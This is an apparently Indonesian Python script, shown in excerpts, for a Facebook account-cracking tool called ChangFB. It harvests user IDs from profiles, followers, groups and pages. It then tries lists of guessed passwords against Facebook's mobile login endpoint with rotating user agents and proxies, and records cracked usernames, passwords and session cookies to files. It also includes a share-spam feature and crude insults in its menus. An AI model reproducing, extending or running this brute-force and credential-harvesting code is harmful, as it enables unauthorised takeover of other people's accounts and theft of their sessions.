...
def banner():
	...
	print(f'''{bo}{N}╭──────────────[{sir} Author : The Changcuters {x}]''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		cookie=input(f'{N}╭──────────────[{asu} Author : The Changcuters {N}]\n{N}│\n{N}│ ╭[\033[41m\033[1;37m Status : Premium \x1b[0m\x1b[1;97m]─────────────━\x1b[38;5;196m㋱\x1b[38;5;226m•\x1b[1;97m[{asu}INDONESIA\x1b[1;97m]•\x1b[38;5;196m㋱\x1b[1;97m{N}━╮\n{N}│ │                                                    {N}│\n{N}│ │ {asu} ██▀▄▀██▒▐█▀▀▄░\x1b[0m▄{asu}░▐█▀█▒▐█▒▒▐█░ ▄█▀▄─░██▄░▒█▌▒▐█▀▀█ {N} │\n{N}│ │  {asu}██░▀░██▒▐█▒▐█░░░▐█──▒▐█████░▐█▄▄▐█▒▐█▒█▒█░░▐█▒▄▄ {N} │\n{N}│ │  {asu}██▒─▒██▒▐█▀▄▄░\x1b[0m▄{asu}░▐█▄█▒▐█▒▒▐█░▐█─░▐█░██░▒██▌░▐█▄▄█ {N} │\n{N}│ │  {asu}WhatsApp {P}: {asu}0819-0776-1235                         {N}│\n{N}│ ╰─[{h}MENU{x}]──────────────────────────────────[\033[41m\033[1;37m ChangFB \x1b[0m\x1b[1;97m{N}]╯\n{N}├───{x}[{h}1{x}]{k} Crack Publik   {x}[{h}6{x}]{k} Share posting FB\n{N}├───{x}[{h}2{x}]{k} Crack Follower {x}[{h}7{x}]{k} Crack Grup\n{N}├───{x}[{h}3{x}]{k} Lapor bug      {x}[{h}8{x}]{k} Crack Halaman\n{N}├───{x}[{h}3{x}]{k} Lapor bug      {x}[{h}8{x}]{k} Crack Halaman\n{N}├───{x}[{h}4{x}]{k} Crack File{h}√    {x}[{h}9{x}]{k} Crack Massal\n{N}├───{x}[{h}5{x}]{k} Hasil Crack    {x}[{h}0{x}]{k} ChangFB\n{N}│ ╭────────────────────────────────────────────────────╮\n{N}│ │{asu} ▄▄▌         ▄▄ • ▪   ▐ ▄     ·▄▄▄▄  ▄• ▄▌▄▄▌  ▄• ▄▌{N}│\n{N}│ │{asu} ██•  ▪     ▐█ ▀ ▪██ •█▌▐█    ██▪ ██ █▪██▌██•  █▪██▌{N}│\n{N}│ │{asu} ██▪   ▄█▀▄ ▄█ ▀█▄▐█·▐█▐▐▌    ▐█· ▐█▌█▌▐█▌██▪  █▌▐█▌{N}│\n{N}│ │{asu} ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▌██▐█▌    ██. ██ ▐█▄█▌▐█▌▐▌▐█▄█▌{N}│\n{N}│ │{asu} .▀▀▀  ▀█▄▀▪·▀▀▀▀ ▀▀▀▀▀ █▪    ▀▀▀▀▀•  ▀▀▀ .▀▀▀  ▀▀▀ {N}│\n{N}│ │  {h}WhatsApp{N} : {asu}0822-6131-0817                         {N}│\n{N}│ ╰─────────────────────────────────────────[\033[41m\033[1;37m ChangFB \x1b[0m\x1b[1;97m{N}]╯\n{N}├───[{H}+{N}] Masukkan Cookies :{asu} ')
		...
		print(f'{N}╭───[{H}+{N}]{h} Selamat Datang Di Dunia Cracking\n{N}│ ╭[\033[41m\033[1;37m Status : Premium \x1b[0m\x1b[1;97m]─────────────━\x1b[38;5;196m㋱\x1b[38;5;226m•\x1b[1;97m[{asu}INDONESIA\x1b[1;97m]•\x1b[38;5;196m㋱\x1b[1;97m{N}━╮\n{N}│ │                                                    {N}│\n{N}│ │ {asu} ██▀▄▀██▒▐█▀▀▄░\x1b[0m▄{asu}░▐█▀█▒▐█▒▒▐█░ ▄█▀▄─░██▄░▒█▌▒▐█▀▀█ {N} │\n{N}│ │  {asu}██░▀░██▒▐█▒▐█░░░▐█──▒▐█████░▐█▄▄▐█▒▐█▒█▒█░░▐█▒▄▄ {N} │\n{N}│ │  {asu}██▒─▒██▒▐█▀▄▄░\x1b[0m▄{asu}░▐█▄█▒▐█▒▒▐█░▐█─░▐█░██░▒██▌░▐█▄▄█ {N} │\n{N}│ │  {asu}WhatsApp {P}: {asu}0819-0776-1235                         {N}│\n{N}│ ╰─[{h}MENU{x}]──────────────────────────────────[\033[41m\033[1;37m ChangFB \x1b[0m\x1b[1;97m{N}]╯\n{N}╰───[{h}•{x}]{h} Login Berhasil.........!😱{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'{N}╰───%s[%sx%s]%s Login Gagal.....😝%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	try:
		...
		print(f'{N}├───[{asu}+{N}] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'github.com/ChangFB'
	print(f'│ ╭[\033[41m\033[1;37m Status : Premium \x1b[0m\x1b[1;97m{N}]───────────━{B}㋱{K}•{N}[\033[41m\033[1;37m INDONESIA \x1b[0m\x1b[1;97m{N}]{K}•{B}㋱{N}━╮')
	print(f'│ │                                                    {N}│')
	print(f'│ │  ██▀▄▀██▒▐█▀▀▄░▄░▐█▀█▒▐█▒▒▐█░ ▄█▀▄─░██▄░▒█▌▒▐█▀▀█ {N} │')
	print(f'│ │  ██░▀░██▒▐█▒▐█░░░▐█──▒▐█████░▐█▄▄▐█▒▐█▒█▒█░░▐█▒▄▄ {N} │')
	print(f'│ │  ██▒─▒██▒▐█▀▄▄░▄░▐█▄█▒▐█▒▒▐█░▐█─░▐█░██░▒██▌░▐█▄▄█ {N} │')
	print(f'│ │  WhatsApp : 0819-0776-1235                         {N}│')
	print(f'│ ╰─[{H}MENU{N}]──────────────────────────────────[\033[41m\033[1;37m ChangFB \x1b[0m\x1b[1;97m{N}]╯')
	print(f'{N}├───[{asu}+{N}] Your Idz : '+str(my_id))
	print(f'{N}├───[{asu}+{N}] Your Ip  : {ip}')
	print(f'{N}├───[{asu}+{N}] Github   : {gh}')
	print(f'{N}├───[{asu}✓{N}]{H} Status   {N}: {asu}Premium')
	print(f'{N}├───[{h}1{N}] Crack Publik ')
	print(f'{N}├───[{h}2{N}] Crack Follower ')
	print(f'{N}├───[{h}3{N}] Lapor bug  ')
	print(f'{N}├───[{h}4{N}] Crack File	')
	print(f'{N}├───[{h}5{N}] Hasil Crack  ')
	print(f'{N}├───[{h}6{N}] Share posting FB ')
	print(f'{N}├───[{h}0{N}] Keluar       ')
	print(f'{N}├──╭[{h}MENU{x}]──────────────────────────────────────────────')
	_____alvino__adijaya_____ = input(f'\r│  ╰─➣{h} ')
	if _____alvino__adijaya_____ in ['1']:
		...
		print(f'{N}├───[{H}+{N}] Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print(f'{N}├───[{H}+{N}] Pilih Yang Bener ')
		back()
def error():
	jalan(f'├───[{H}+{N}]{sir} tunggu anda akan di Arahakn ke Facebook  {x}')
	time.sleep(4)
...
def result():
	...
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			print(f'{N}├───[{H}+{N}] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'{N}├───[{H}+{N}] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			geeh = input(f'{N}├───[{H}+{N}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{N}├───[{H}+{N}] Pilih Yang Bener Kontol ')
				back()
			...
			for cpku in range(len(lin)):
				...
				print(f'{N}├───[{H}+{N}] {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print(f'{N}├───[{H}+{N}] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{N}├───[{H}+{N}] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{N}├───[{H}+{N}][{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'{N}├───[{H}+{N}] Mau Berapa Target Chang : {h}'))
	except ValueError:
		print(f'{N}├───[{H}+{N}] Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print(f'{N}├───[{H}+{N}] Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
...
def lah():
	print(f'{N}├───[{H}+{N}] Total Idz Yang Terkumpul :{h} %s '%(len(id)))
	input(f'{N}├───[{H}+{N}] [ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{N}├───[{H}+{N}] Masukkan Username Atau Idz Grup : ')
	#ua = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'
	...
	try:
		...
		print(f'{N}├───[{H}+{N}] Sinyal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	...
	if berr2=='Masuk Facebook':
		...
		alvino_xy(f'{N}├───[{H}+{N}] Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'{N}├───[{H}+{N}] Nama Grup : {b}%s'%(berr2))
	...
	if len(ang)==0:
		...
		print(f'{N}├───[{H}+{N}] Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{N}├───[{H}+{N}] Sedang Mengumpulkan Idz ')
	print(f'{N}├───[{H}+{N}] Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			#ua = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'
			miskinlu = {"user-agent": ua}
...
threads = []
def memek():
	print(f"{N}├───[{H}1{N}] Spam share via token dan cookie Di Sarankan")
	ask = input(f"{N}├───[{H}+{N}]Pilih : ")
	if ask in["1"]:
		token_cookie()
...
def crack_file():
	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
		...
		print(f'{N}├───[{H}+{N}] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		...
		kontol = input(f'{N}├───[{H}+{N}] Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print(f'{N}├───[{H}+{N}] Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'{N}├───[{H}+{N}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'{N}├───[{H}+{N}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print(f'{N}├───[{H}+{N}] Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		...
		for isi in vin:
			...
			if cih<100:
				...
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{N}├───[{H}+{N}] %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(f'{N}├───[{H}+{N}] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(f'{N}├───[{H}+{N}] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
		...
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
			...
			print(f'{N}├───[{H}+{N}] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
def setting():
	print(f'{N}├───────────────────────────────────────────────────────')
	print(f'{N}├───[{H}1{N}] Akun Old ')
	print(f'{N}├───[{H}2{N}] Akun New ')
	print(f'{N}├───[{H}3{N}] Random ')
	print(f'{N}├──╭[{h}METODE{N}]────────────────────────────────────────────')
	hu = input(f'│  ╰─➣{h} ')
	if hu in ['1','01']:
		...
		exit()
	print(f'{N}├───────────────────────────────────────────────────────')
	print(f'{N}├───[{H}1{N}] Mobile ')
	print(f'{N}├───[{H}2{N}] Mbasic ')
	print(f'{N}├───[{H}3{N}] Touch  ')
	print(f'{N}├───[{H}4{N}] Mtouch ')
	print(f'├──╭[{h}METODE{N}]────────────────────────────────────────────')
	hc = input(f'│  ╰─➣{h} ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print(f'{N}│')
	_jembot_ = input(f'{N}├───[{H}+{N}] Tambahkan Aplikasi ({b}Y{N}/{h}T{N}) ')
	if _jembot_ in ['']:
		print(f'{N}├───[{H}+{N}] Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input(f'{N}├───[{H}+{N}] Tambahkan Password Manual ({b}Y{N}/{h}T{N}) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input(f'{N}├───[{H}+{N}] Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	jalan(f'{N}│ ╭────────────────────────────────────────────────────╮\n{N}│ │ [{h}•{x}] Hasil {h}OK{x} Tersimpan Di : {h}%s{x}  {N}│'%(okc))
	jalan(f'{N}│ │ [{b}•{x}] Hasil {b}CP{x} Tersimpan Di : {b}%s{x}  {N}│'%(cpc))
	jalan(f'{N}│ ╰────────[{k}MAINKAN MODE PESAWAT SETIAP 1K ID{N}]─────────╯') #%(okc,cpc))
	jalan(f"│")
	...
	print('│')
	print(f'├───[{b}•{x}] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input(f'╰───[{b}•{x}] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Croot Blum ]{x} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r└\x1b[1;90m[%s\x1b[1;93mChangFB\x1b[1;90m]-[\x1b[1;91m%s\x1b[1;90m/\33[m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\33[1;96mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s ✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
...
def cracktouch(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r└───\x1b[1;90m[%s\x1b[1;91mChangFB\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s ✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ugent = random.choice([
...
'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; 17MB150WB Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Safari/537.36'
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└──╭➣[{K}ChangCP{x}] {K}{idf} | {pw}{N}\n   └───➣ {ua}{B}')
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└──╭➣[{h}ChangOK{x}] {H}{idf} | {pw}\n  └──╭➣ {kuki}\n│        └───➣ {ua}{M}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
